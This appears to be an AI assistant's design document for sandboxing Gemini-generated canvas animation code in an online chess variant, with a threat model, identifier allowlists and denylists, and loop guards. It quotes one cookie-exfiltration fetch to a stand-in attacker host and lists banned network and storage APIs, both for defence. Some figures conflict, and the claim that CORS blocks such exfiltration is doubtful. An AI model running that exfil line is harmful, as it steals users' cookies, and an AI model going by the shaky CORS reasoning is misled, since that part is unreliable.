# Ship #3 — AI-generated visuals

The whole point of arena mode was supposed to be "the AI makes everything,
no hardcoded BS." Ships #1-2 got us a working mechanical engine with
discoverability + feedback, but the visuals are still emoji-shaped text
overlays and a 700ms flash. Ship #3 is where the AI starts drawing.

This is also the most security-sensitive change in the project so far. Every
draw the AI emits is **executable JavaScript that runs in real browsers**.
Every architectural decision in here is downstream of "this can't be the
exploit that takes the site down."

## Goals

1. Per-piece visual customization. The AI emits up to seven slot draws
   (`body`, `head`, `back`, `weapon_R`, `weapon_L`, `feet`, `aura`) per
   piece type. Each slot is a function body painting on a pre-translated
   canvas around `(0, 0)` in an 80×80 box.
2. Animated projectiles between squares for ability casts. The fireball
   actually flies from caster to target. Specific to AOE casts: the inner
   draw lights up each affected square.
3. Full-board overlays. Frost aura around a frozen piece. Curse trail
   following a marked unit. Damage-flash screen overlay on big hits.
4. Cosmetic per-move brain hooks. Idle wobble. Charge-up glow before a
   cast. Hit reaction shake.

All of the above written by Gemini, validated by us, run in a sandboxed
iframe so it can never touch the parent DOM, network, or storage.

## Non-goals (deliberately deferred)

- **AI-written rule logic** stays out of scope. The engine remains data-
  driven; the AI only writes visual JS. The Ship #2 verifier still gates
  playability.
- **Audio synthesis**. Cast sounds stay as the existing Lichess
  library tones; AI doesn't get a Web Audio API.
- **3D / WebGL**. Canvas 2D only. Same browser-support floor.
- **Per-user theme persistence**. We're shipping the visual engine; the
  saved-variants library lands in Ship #4.

---

## Architecture

```
                        ┌─────────────────────────────────────┐
                        │ Parent page (oChess React app)      │
                        │                                     │
                        │  ArenaRoom                          │
                        │   ├─ InteractiveBoard               │
                        │   ├─ <iframe sandbox=             > │
                        │   │     srcdoc="<paint runtime>"   │
                        │   │     allow="">                  │
                        │   │   ┌───────────────────────┐    │
                        │   │   │ Sandbox iframe        │    │
                        │   │   │                       │    │
                        │   │   │  - Canvas overlay     │    │
                        │   │   │  - RAF paint loop     │    │
                        │   │   │  - AI-written draws   │    │
                        │   │   │    (Function bodies)  │    │
                        │   │   │  - postMessage in/out │    │
                        │   │   │  - NO net, NO storage │    │
                        │   │   │  - NO parent DOM      │    │
                        │   │   └───────────────────────┘    │
                        │   ├─ ArenaAbilityPanel              │
                        │   └─ Debug panel (Ship #3 NEW)      │
                        │                                     │
                        │  Engine (lib/arena/...)             │
                        │   - Position, move-gen, apply       │
                        │   - Authoritative game state        │
                        │   - AbsolutelyNeverChangedByJS      │
                        └─────────────────────────────────────┘
                                    │ postMessage
                                    ▼
                        ┌─────────────────────────────────────┐
                        │ Sandbox iframe (sandbox attr =      │
                        │   "allow-scripts" only)             │
                        │                                     │
                        │  Inbox messages from parent:        │
                        │   - INIT(rules, validatedDraws,     │
                        │           seed)                     │
                        │   - SCENE(position, marks,          │
                        │           lastCast, time)           │
                        │   - DEBUG(verbosity)                │
                        │                                     │
                        │  Outbox messages to parent:         │
                        │   - READY                           │
                        │   - PAINT_DONE(frame_no, ms)        │
                        │   - DRAW_ERROR(slot, msg, stack)    │
                        │   - PERF_REPORT(p50, p99, drops)    │
                        │                                     │
                        │  Internal:                          │
                        │   - Validated draw functions in     │
                        │     Function.prototype shielded     │
                        │     wrappers                        │
                        │   - Match-seeded PRNG (xoshiro)     │
                        │   - Loop-guarded with __g counters  │
                        │   - Per-frame budget enforced       │
                        │     via performance.now()           │
                        └─────────────────────────────────────┘
```

The parent and sandbox communicate via `postMessage` with a versioned
protocol. The parent NEVER passes a function reference into the iframe;
only stringified Function bodies, deserialized inside the iframe via
`new Function(...)`. The iframe NEVER passes a function reference back;
only PERF / ERROR data.

### Why iframe-srcdoc and not Web Workers

Both isolate from the parent DOM. The iframe wins because:

- We can use a real `<canvas>` and the standard 2D API directly. Worker
  + OffscreenCanvas works in Chromium but Safari has long-standing
  bugs. Iframe + canvas works everywhere.
- The `sandbox` attribute (with NO `allow-same-origin`) gives us a fresh
  origin per iframe, blocking access to localStorage, IndexedDB,
  cookies, and document API to the parent.
- Workers can `fetch()` and use `WebSocket` by default. Iframes with
  `sandbox=""` (no `allow-*` flags) cannot. We add only `allow-scripts`
  so the AI code can run.
- Easier to debug. The iframe shows up in DevTools; you can inspect the
  paint loop live.

The cost is `postMessage` latency — about 0.5-1ms round-trip on warm
calls. For our 30fps budget (33ms total), this is acceptable.

### Why NOT just hardcode preset effects per tag

Briefly considered: the AI marks an ability with `tag: "frost"` and the
engine renders a hand-coded frost animation. Faster to ship, no security
risk, no XSS. **Rejected because** it defeats the point. You said "we
can't hard code any BS." The whole pitch of arena mode is unbounded
visual creativity. Presets cap it at whatever I built.

We do still ship a small set of fallback animations that fire when:
1. The AI fails to emit a draw for a slot (graceful degradation), OR
2. The AI's draw threw enough errors to be disabled (defense in depth).

So presets exist, but as fallback floor, not primary surface.

---

## The sandbox: every threat we can think of and how we block it

### Threat: AI emits `fetch("//attacker/exfil?" + document.cookie)`

**Block**: iframe `sandbox` attribute set to `sandbox="allow-scripts"`
ONLY. No `allow-same-origin`, so the iframe runs in a fresh opaque
origin. `document.cookie` returns empty. `fetch()` and `XMLHttpRequest`
are still available API-wise, but cross-origin requests would fail CORS
because the opaque origin has no `Origin: ...` header that any backend
trusts.

Also: the AST validator BANS `fetch`, `XMLHttpRequest`, `WebSocket`,
`EventSource`, `navigator`, and the `Image` constructor (which can
exfiltrate via `<img src=...>`).

### Threat: AI emits `eval("malicious")` or `new Function("malicious")`

**Block**: AST validator bans `eval`, `Function`, `new Function`,
`constructor` access, `__proto__` access, `prototype` access. Any token
matching the banlist => reject the entire variant before it ever
reaches the iframe.

### Threat: AI writes an infinite loop, freezing the page

**Block**: AST validator INJECTS a loop guard into every `for`, `while`,
`do-while`, and recursion-prone function. The injected code is:

```js
let __g = 0;
for (...) {
  if (++__g > 5000) throw new Error("loop-guard exceeded 5000 iters");
  ...body...
}
```

Plus a wall-clock check on every function entry: if `performance.now() -
__t0 > 40`, throw. If a draw still hangs the iframe past 100ms, the
parent kills it via `iframe.src = ""` and disables that variant's draws
for the rest of the match.

### Threat: AI writes `parent.location = "//phish"` or accesses parent DOM

**Block**: with `sandbox=""` (no `allow-same-origin`), the iframe's
`parent` reference exists but every cross-origin property access throws
`SecurityError`. The AI couldn't even READ the URL. Setting `location`
silently fails.

### Threat: AI writes `ctx.fillText("slur on the screen")`

**Block**: AST validator bans `ctx.fillText` and `ctx.strokeText`. AI
cannot render arbitrary text on the canvas. Numbers (durations, charge
counts) are rendered by the parent React layer outside the iframe.

### Threat: AI writes `ctx.drawImage(externalUrl)` to load an arbitrary URL

**Block**: AST validator bans `ctx.drawImage`. Even if it didn't, the
opaque origin would fail to load any external image due to CORS. AI can
only draw using primitive shape APIs.

### Threat: AI emits a draw that throws immediately, breaking every frame

**Block**: each draw call is wrapped in `try/catch`. After 30 errors
across the match, the offending slot is disabled. After 100 total errors
across all slots, the match pauses with "this variant has visual bugs,
regenerate?" — the user-facing hard-fail UX you asked for.

### Threat: AI emits a draw that uses 100% CPU silently

**Block**: per-frame budget enforcement. We measure each draw call's
`performance.now()` cost. If a single slot draw exceeds 5ms, it's flagged
as a slow-slot. After 10 slow-frame contributions, that slot is downgraded
to a fallback preset.

### Threat: AI floods `console.log` to lag DevTools

**Block**: the AST validator bans `console.log`/`console.warn`/etc. Output
goes through a parent-postMessage `DEBUG` channel that's rate-limited to
50 messages/sec.

### Threat: prompt injection makes Gemini emit JS that exploits a sandbox bug

This is the residual risk. We can't prove the sandbox is bug-free. We
CAN:

1. Run an automated adversarial test suite of known sandbox-escape
   patterns (`window.parent.parent`, prototype pollution attempts,
   regex-based AST bypasses) on every variant.
2. Log every blocked attempt to a server-side audit table.
3. Have a kill switch: setting `ai_settings.disable_drawn_visuals = true`
   makes the lobby skip the iframe entirely and fall back to Ship #2's
   text badges + flash. One-line SQL update if anything suspicious shows
   up.

---

## AST validator allowlist (exact identifier list)

Every identifier or member-access expression in an AI-emitted draw goes
through this filter. Match by EXACT TEXT (not partial substring) to
prevent bypass via concatenation.

### Permitted globals

```
Math, Math.PI, Math.E,
Math.abs, Math.floor, Math.ceil, Math.round, Math.sign, Math.trunc,
Math.min, Math.max, Math.pow, Math.sqrt, Math.cbrt, Math.hypot,
Math.sin, Math.cos, Math.tan, Math.asin, Math.acos, Math.atan, Math.atan2,
Math.log, Math.log2, Math.log10, Math.exp,
Number.isFinite, Number.isInteger, Number.MAX_SAFE_INTEGER,
Array.from, Array.isArray, Array.of,
Object.keys, Object.values, Object.entries, Object.freeze,
JSON.stringify, JSON.parse,
String, Number, Boolean, Symbol.iterator,
parseInt, parseFloat,
isNaN, isFinite,
Infinity, NaN, undefined, null, true, false,
performance.now,
```

### Permitted in-scope variables (passed by sandbox runtime)

Every draw function gets these arguments and ONLY these:

```
ctx       // CanvasRenderingContext2D, with a wrapped draw API
x, y      // numeric position the slot is centered on
facing    // 1 (right-facing) or -1 (left-facing) - white/black flip
owner     // { type: 'p'|'n'|...|'k', color: 'w'|'b' }
t         // number (ms since match start, derived from match seed +
          // current frame timestamp; identical on both clients)
random    // function () => number in [0,1) — match-seeded PRNG
state     // optional small per-piece state map the brain populates
```

Plus for projectile draws: `{ progress, fromX, fromY, toX, toY, ... }`.
Plus for board overlay draws: `{ width, height, marks, lastCast, ... }`.

### Permitted ctx properties

Strict allowlist. Anything not on this list rejects the draw.

```
fillStyle, strokeStyle, lineWidth, lineCap, lineJoin, miterLimit,
globalAlpha, globalCompositeOperation,
shadowColor, shadowBlur, shadowOffsetX, shadowOffsetY,

fillRect, clearRect, strokeRect,
beginPath, closePath, moveTo, lineTo, bezierCurveTo, quadraticCurveTo,
arc, arcTo, ellipse, rect,
fill, stroke,
save, restore,
translate, rotate, scale, transform, setTransform,
createLinearGradient, createRadialGradient, addColorStop,
```

### BANNED everywhere — any occurrence rejects the variant

```
fetch, XMLHttpRequest, WebSocket, EventSource, navigator, Image,
import, eval, Function, new Function,
document, window, globalThis, parent, top, self,
.constructor, .__proto__, .prototype,
localStorage, sessionStorage, indexedDB, cookie,
postMessage, addEventListener, removeEventListener,
setTimeout, setInterval, clearTimeout, clearInterval,
requestAnimationFrame, requestIdleCallback,
process, require, module, exports,
ctx.fillText, ctx.strokeText, ctx.drawImage,
ctx.measureText, ctx.createImageData, ctx.getImageData, ctx.putImageData,
new Date, Date.now,    // use t parameter instead - replay-friendly
crypto, WebAssembly,
ServiceWorker, SharedWorker,
```

Anything else that doesn't appear on the allowlist defaults to **reject**.
"Reject by default" is non-negotiable; if Gemini emits something we didn't
think of, the safe answer is "no" until we explicitly approve it.

---

## Loop-guard injection rules

Every `for`, `while`, `do-while` statement in the AST gets wrapped:

```js
// before
for (let i = 0; i < n; i++) { /* body */ }

// after
{
  let __g0 = 0;
  for (let i = 0; i < n; i++) {
    if (++__g0 > 5000) throw new Error("loop-guard");
    /* body */
  }
}
```

Every function declaration / arrow / expression gets a wall-clock check:

```js
// before
function paint(ctx, x, y) { /* body */ }

// after
function paint(ctx, x, y) {
  const __t0 = performance.now();
  // body, with periodic __t0-elapsed throws after deep blocks
  if (performance.now() - __t0 > 40) throw new Error("time-budget");
  /* body */
}
```

Counters use unique names (`__g0`, `__g1`, ...) per loop scope so nested
loops don't clobber each other.

Limits chosen to match the warrior reference architecture (50K iters /
40ms per call). Empirically these block runaway loops before they freeze
the iframe past noticeable lag.

---

## Match-seeded PRNG

Every animation needs randomness — particle directions, twinkles, glints.
We use a deterministic PRNG seeded from the match ID so:

- Both clients render IDENTICAL animations (no "hey it looked different
  on my screen")
- Replays produce the same animations as live play (replay scrubbing
  shows the same fireball trail you saw in the match)
- Spectators see the same thing as players

Implementation: small xoshiro128+ seeded from `hash(match_id + cast_id)`.
Each cast gets its own substream so two casts don't visually overlap in
unintended ways.

The runtime exposes `random()` as a sandbox global. `Math.random` is also
shadowed inside the iframe to reroute to the seeded PRNG, in case Gemini
forgets to use the parameter.

---

## Per-frame perf budget

Target: **30fps**, so 33ms total per frame. Budget breakdown:

```
~5ms   - postMessage RTT (parent → sandbox SCENE message)
~15ms  - all AI-written draws across all pieces and projectiles
~5ms   - canvas paint dispatch + GPU upload
~3ms   - parent React reconcile + state update
~5ms   - safety margin
```

Per-slot draw target: **<2ms median**. Anything sustained at >5ms
gets downgraded.

Enforcement:

1. The parent batches one SCENE message per frame.
2. The iframe's RAF callback iterates every active slot/projectile/
   overlay and calls each draw with `performance.now()` brackets.
3. Any single draw exceeding 5ms increments a slow-counter for that
   slot. After 10 slow-frames, the slot is replaced with a fallback
   preset (a small set of hand-coded "atoms": glow, ring, sparkle).
4. Total frame time exceeding 33ms → iframe sends `PERF_REPORT` back
   with stats; the parent surfaces "Your variant runs slowly on your
   hardware. Some effects have been simplified." in the debug panel.

We're explicit that **30fps is target, not floor**. Mobile browsers on
older hardware may drop to 20fps. The game stays mechanically functional
because the engine is in the parent, not the iframe.

---

## Hard-fail with debug capture

You said: "hard fail offer regenerate + debugging for everything." Here's
what that actually means.

### Per-error capture

Every draw error captured in the iframe is sent to the parent via a
`DRAW_ERROR` message:

```ts
{
  slot: "q.aura",            // which draw was running
  ply: 23,                   // which game ply (so we can reproduce)
  caster: "d4",              // which piece's draw
  error: "loop-guard exceeded 5000 iters",
  stack: "at body (line 12, col 4)",
  source_excerpt: "for (let i = 0; i < 1e9; i++) { ... }",  // 200-char window around the error
  perf_history: [4.2, 5.1, 6.8, 4.9],  // last 4 frame times for this slot
}
```

The parent collects these in a `debugErrors` ring buffer (last 50
entries) and exposes them in a debug panel.

### First error → pause match

The very first `DRAW_ERROR` from the iframe pauses the match. The board
freezes. A modal appears:

```
Variant has a visual bug
Slot: queen aura
Error: loop-guard exceeded 5000 iters
At cast: ply 23, caster d4

[ Regenerate variant ] [ Continue without visuals ] [ Show debug ]
```

User picks one:

- **Regenerate**: restart the round with a fresh AI generation. Clock
  resets for the round. Move history kept for the previous round.
- **Continue without visuals**: disable the iframe entirely for the
  rest of the match. Falls back to Ship #2's text badges + flash.
- **Show debug**: opens the debug panel with all captured errors,
  source excerpts, and the AI-emitted JS for the broken slot. User
  can copy + paste into a bug report.

### Debug panel

Permanent in the right sidebar (collapsed by default; shows a small
red dot when errors > 0). Expanded:

```
DEBUG
  Slots
    q.aura        ✓ 234 frames, p50 1.2ms, p99 3.4ms
    n.body        ⚠ 45 frames, p50 5.8ms (downgraded)
    b.weapon_R    ✗ disabled after 30 errors

  Recent errors (3 / 50)
    [ply 23] q.aura: loop-guard
    [ply 24] q.aura: loop-guard (suppressed - same as last)
    [ply 28] n.body: time-budget exceeded

  Sandbox health
    iframe: alive (uptime 4m 23s)
    last paint: 16ms ago
    perf: avg 18ms/frame, 0% drops

  [Copy debug bundle to clipboard]
```

The "copy debug bundle" includes the rules diff, the failing draws'
source, the error logs, the position FEN, and the cast history. Drop it
into a bug report and we have everything.

### Server-side audit log (for prompt iteration)

Errors aggregate into an `arena_visual_errors` server-side log keyed by
prompt + Gemini model + AST path. Lets us see "Gemini 2.5-flash emits
loop-bugged draws for `tag: chain_lightning` 40% of the time" and patch
the system prompt accordingly.

---

## What the AI prompt looks like

The factory call's system prompt grows by ~5KB to teach Gemini the new
draw API. We add:

1. **Schema docs**: the slot enum (body/head/etc), the draw function
   signatures, the canvas API allowlist, the banned identifiers, the
   loop budget.

2. **Three worked examples per primitive shape**:
   - Slot draw: a "frost queen aura" that paints icy crystals
     pulsing at random angles.
   - Projectile draw: a "fireball" that paints a bright orb with a
     trailing flame.
   - Overlay draw: a "screen flash" full-board white flash with
     fade-out.
   - Brain (cosmetic): an idle wobble that rotates the piece by
     `Math.sin(t * 0.001) * 5` degrees.

3. **Critical constraints**:
   - "Never use `Date.now()` or `Math.random()`. Use the `t` and
     `random` parameters."
   - "Never use `setTimeout`/`setInterval`/`requestAnimationFrame`.
     Your draw is called once per frame already."
   - "Never use `console.log`. The sandbox doesn't have one."
   - "Loops in your draw must terminate quickly. The sandbox kills
     loops at 5K iterations per call."
   - "Use only the canvas API listed above. Anything else throws."

4. **Targeted patterns Gemini already gets wrong**:
   - "Don't compute pixel coordinates from board coordinates. The
     `x, y` you receive is already in screen coords; the slot box is
     80×80 around (0, 0)."
   - "Don't allocate large arrays per frame. Use the `state` object
     to cache results that don't change."

System prompt growth: from ~22KB → ~27KB. Output size also grows: each
slot draw is 100-500 tokens, so a fully-decorated piece (3 active slots)
adds ~1500 tokens to the response. Total per-generation cost roughly
doubles, from $0.013 → $0.025.

---

## Cost analysis

| | Ship #2 | Ship #3 (estimated) |
|---|---|---|
| Per-generation tokens (in/out) | 7K / 800 | 9K / 2500 |
| Per-generation cost @ Flash | $0.0007 | $0.0014 |
| 100 gens / day cost | $0.07 | $0.14 |
| Monthly @ 100 gens / day | $2.10 | $4.20 |

Even with Ship #3's larger output, we're at €4-5/month at 100 active
generations/day. **The €100/month cap is fine** with massive headroom.
You'd need ~2000 generations/day before the cap matters.

---

## Five phases — what ships when

### Phase 1 — Design lock (THIS DOC)
The doc you're reading. No code. Lock the design with one round of
review.

### Phase 2 — Sandbox infrastructure
- AST validator (`lib/arena/visual-sandbox/ast-validator.js`)
- Loop-guard injector (`lib/arena/visual-sandbox/inject-loop-guard.js`)
- Sandbox iframe runtime (`public/arena-sandbox.html` and
  `public/arena-sandbox.js` served as static assets)
- postMessage protocol versioning
- Adversarial test suite (`lib/arena/visual-sandbox/__attacks.test.js`)
  with known sandbox-escape patterns

Standalone testable. No AI integration yet. Lots of unit tests that
specifically attack the validator.

### Phase 3 — Canvas overlay layer
- `ArenaVisualOverlay` React component that mounts the iframe
- Per-frame SCENE dispatch
- Slot/projectile/overlay registration on rules + crazyState change
- Match-seeded PRNG plumbing
- Fallback preset library for "draw failed" cases (~10 atoms)

Hand-coded test draws used for verification — no AI yet.

### Phase 4 — AI integration
- Extend SYSTEM_PROMPT in `arena_rules/index.ts` with the draw schema
  + worked examples
- Update the factory to optionally emit `slots`, `projectile`, `overlay`,
  `brain` fields per piece/ability
- Update the structural validator to accept the new fields and run them
  through the AST validator before storing
- Update the harness to test draw-emission rate across the
  20-prompt batch
- Update the Edge Function spend math (slightly higher cost per gen)

### Phase 5 — Debug + polish
- Debug panel React component
- `arena_visual_errors` audit table + RPC to record errors server-side
- Hard-fail-with-regenerate flow in `ArenaRoom`
- Kill switch in `ai_settings.disable_drawn_visuals`
- Live-AI adversarial test: run 50 generated variants, count errors,
  measure perf

After Phase 5, you have AI-painted pieces, projectiles, and full-board
overlays in arena mode. The text badges from Ship #2 disappear (replaced
by AI auras).

---

## What I'd push back on

A few things you asked for that I think are right but worth being explicit
about:

1. **"Hard fail with regenerate" is harsh during a live PvP match.** If
   the AI emits a buggy draw and the match pauses on first error, both
   players have to agree to regenerate or continue without visuals. That
   interrupts gameplay. Consider: a "soft-fail with auto-disable + small
   notice" UX for in-match draws (so the game keeps playing) + the
   "hard-fail with regenerate" UX only for the lobby preview phase.
2. **Match-seeded RNG limits late-arriving spectators.** A spectator who
   joins at ply 30 sees the SAME animations as the players, replayed
   from ply 0 in fast-forward. That's good for replay but bad for live
   spectating UX. We may need a "spectator joined late, skip animation
   replay" branch.
3. **The full warrior pattern is a LOT of surface area for one ship.**
   I genuinely think shipping per-piece slots + projectiles first
   (skipping the brain + full-board overlays for Ship #4) gets us 80%
   of the visual win at 50% of the engineering. Worth discussing.

If any of those need a different answer, let me know before Phase 2.

---

## Open questions for you to push back on

Before I start Phase 2, I want explicit answers on:

1. **In-match hard-fail vs soft-fail**: pause the game on first draw
   error, OR auto-disable the slot + small notice and keep playing?
2. **Slot enum**: 7 slots (warrior architecture) or fewer (e.g. just
   `body` + `aura` for V1)?
3. **Projectiles in V1, or push to Ship #4**?
4. **Iframe sandbox vs main-thread AST**: doc currently says iframe.
   Restating because some of my earlier code assumed main-thread. Iframe
   wins on safety; want to confirm we're spending the latency budget on
   it.
5. **Anything I missed in the threat model**? Eyes welcome.
